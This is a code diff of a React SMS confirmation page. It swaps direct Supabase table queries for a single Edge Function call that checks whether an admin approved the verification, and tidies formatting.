@@ -62,47 +62,27 @@ const SmsConfirmationPage = () => {
     return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
 
-  // Check verification status directly from database - same pattern as payment
-  // Check verification status directly; robust fallbacks if admin clicked the wrong button
+  // Check verification status using Edge Function for consistency across policies
   const checkVerificationStatus = async (id: string) => {
     try {
-      // 1) Primary: check exact verification id
-      const { data: verificationData } = await supabase
-        .from('verification_requests')
-        .select('status')
-        .eq('verification_id', id)
-        .maybeSingle();
+      const { data, error } = await supabase.functions.invoke('check-verification-status', {
+        body: {
+          verificationId: id,
+          userId: location.state.userId,
+        },
+      });
 
-      let status = verificationData?.status as string | undefined;
-
-      // 2) Fallback: latest verification by user
-      if (!status || status === 'pending') {
-        const { data: latest } = await supabase
-          .from('verification_requests')
-          .select('status')
-          .eq('user_id', location.state.userId)
-          .order('created_at', { ascending: false })
-          .limit(1)
-          .maybeSingle();
-        status = latest?.status || status;
+      if (error) {
+        console.error('Edge function error:', error);
+        return;
       }
 
-      // 3) Legacy fallback: payment_sessions approved with sms
-      if (!status || status === 'pending') {
-        const { data: session } = await supabase
-          .from('payment_sessions')
-          .select('payment_status, admin_response')
-          .eq('user_id', location.state.userId)
-          .maybeSingle();
-        if (session?.payment_status === 'approved' && session?.admin_response === 'sms') {
-          status = 'approved';
-        }
-      }
+      const status = data?.status as string | undefined;
 
       if (status === 'approved') {
         console.log('Verification approved! Redirecting...');
-        
-        // Immediately set redirecting state to prevent further polls
+
+        // Prevent further polls
         setIsRedirecting(true);
         if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
         if (pollTimeoutRef.current) clearTimeout(pollTimeoutRef.current);
@@ -110,8 +90,8 @@ const SmsConfirmationPage = () => {
         setIsVerifying(false);
 
         // Analytics event
-        if (window.gtag) {
-          window.gtag('event', 'sms_verified');
+        if ((window as any).gtag) {
+          (window as any).gtag('event', 'sms_verified');
         }
 
         // Generate order ID if missing
@@ -123,18 +103,18 @@ const SmsConfirmationPage = () => {
         if (location.state.customerInfo) saveCustomerInfo(location.state.customerInfo);
 
         // Notify user and redirect
-        toast({ title: "Verified", description: "Approved by admin. Redirecting..." });
-        
+        toast({ title: 'Verified', description: 'Approved by admin. Redirecting...' });
+
         // Replace history entry and include order id in URL as fallback
         navigate(`/confirmation?oid=${orderId}`, {
           replace: true,
           state: {
             ...location.state,
             orderId,
-            completedAt: new Date().toISOString()
-          }
+            completedAt: new Date().toISOString(),
+          },
         });
-        
+
         // Hard redirect fallback if SPA navigation fails for any reason
         setTimeout(() => {
           if (!window.location.pathname.includes('/confirmation')) {
@@ -146,14 +126,14 @@ const SmsConfirmationPage = () => {
         if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
         setWaitingForAdmin(false);
         setIsVerifying(false);
-        
+
         toast({
-          variant: "destructive",
-          title: "Verification Failed",
-          description: "Wrong verification code. Please try again.",
+          variant: 'destructive',
+          title: 'Verification Failed',
+          description: 'Wrong verification code. Please try again.',
         });
-        
-        setCode("");
+
+        setCode('');
       }
     } catch (error) {
       console.error('Error checking verification status:', error);
